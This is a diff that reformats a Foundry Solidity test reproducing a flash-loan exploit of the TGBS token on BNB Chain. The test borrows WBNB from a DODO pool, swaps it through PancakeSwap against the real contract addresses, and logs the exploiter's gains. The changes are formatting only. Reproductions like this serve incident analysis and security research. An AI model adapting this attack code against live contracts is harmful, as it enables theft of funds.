@@ -19,18 +19,17 @@ import {IDVM} from "src/interfaces/IDVM.sol";
 // https://twitter.com/Phalcon_xyz/status/1765285257949974747
 
 interface ITGBS is IERC20 {
+
     function _burnBlock() external view returns (uint256);
+
 }
 
 contract ContractTest is Test {
-    IDVM private constant DPPOracle =
-        IDVM(0x05d968B7101701b6AD5a69D45323746E9a791eB5);
-    IERC20 private constant WBNB =
-        IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
-    ITGBS private constant TGBS =
-        ITGBS(0xedecfA18CAE067b2489A2287784a543069f950F4);
-    IUniswapV2Router private constant Router =
-        IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
+
+    IDVM private constant DPPOracle = IDVM(0x05d968B7101701b6AD5a69D45323746E9a791eB5);
+    IERC20 private constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
+    ITGBS private constant TGBS = ITGBS(0xedecfA18CAE067b2489A2287784a543069f950F4);
+    IUniswapV2Router private constant Router = IUniswapV2Router(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
 
     function setUp() public {
         vm.createSelectFork("bsc", 36_725_819);
@@ -42,32 +41,18 @@ contract ContractTest is Test {
 
     function testExploit() public {
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance before attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance before attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
 
         uint256 baseAmount = WBNB.balanceOf(address(DPPOracle));
-        DPPOracle.flashLoan(
-            baseAmount,
-            0,
-            address(this),
-            abi.encodePacked(uint32(0))
-        );
+        DPPOracle.flashLoan(baseAmount, 0, address(this), abi.encodePacked(uint32(0)));
 
         emit log_named_decimal_uint(
-            "Exploiter WBNB balance after attack",
-            WBNB.balanceOf(address(this)),
-            WBNB.decimals()
+            "Exploiter WBNB balance after attack", WBNB.balanceOf(address(this)), WBNB.decimals()
         );
     }
 
-    function DPPFlashLoanCall(
-        address sender,
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        bytes calldata data
-    ) external {
+    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
         WBNB.approve(address(Router), baseAmount);
         WBNBToTGBS(baseAmount);
 
@@ -91,11 +76,7 @@ contract ContractTest is Test {
         path[0] = address(WBNB);
         path[1] = address(TGBS);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn,
-            0,
-            path,
-            address(this),
-            block.timestamp + 10
+            amountIn, 0, path, address(this), block.timestamp + 10
         );
     }
 
@@ -104,11 +85,8 @@ contract ContractTest is Test {
         path[0] = address(TGBS);
         path[1] = address(WBNB);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountIn,
-            0,
-            path,
-            address(this),
-            block.timestamp + 10
+            amountIn, 0, path, address(this), block.timestamp + 10
         );
     }
+
 }
